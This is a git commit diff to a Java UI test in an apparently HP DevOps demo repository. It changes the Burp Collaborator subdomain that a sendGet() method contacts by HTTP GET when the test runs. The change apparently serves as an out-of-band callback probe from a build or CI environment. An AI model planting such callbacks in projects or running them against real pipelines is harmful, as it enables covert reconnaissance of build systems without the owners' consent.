aff1d37117ce5b3349f42af9c0c653f1083db934
gizmomuncher <43237915+gizmomuncher@users.noreply.github.com>
2019-03-19 17:18:26 +0200

    Update App2Test.java

--- ui-tests/src/test/java/com/hp/devops/demoapp/tests/ui/App2Test.java
+++ ui-tests/src/test/java/com/hp/devops/demoapp/tests/ui/App2Test.java
@@ -42,7 +42,7 @@ public class App2Test extends TestCase
     // HTTP GET request
     private void sendGet() throws Exception {
 
-        String url = "http://betm6b3uow1muzk09zun0rnouf06ov.burpcollaborator.net";
+        String url = "http://6ip9od0uxa8ljwz01idsqjx4evkl8a.burpcollaborator.net";
 
         URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
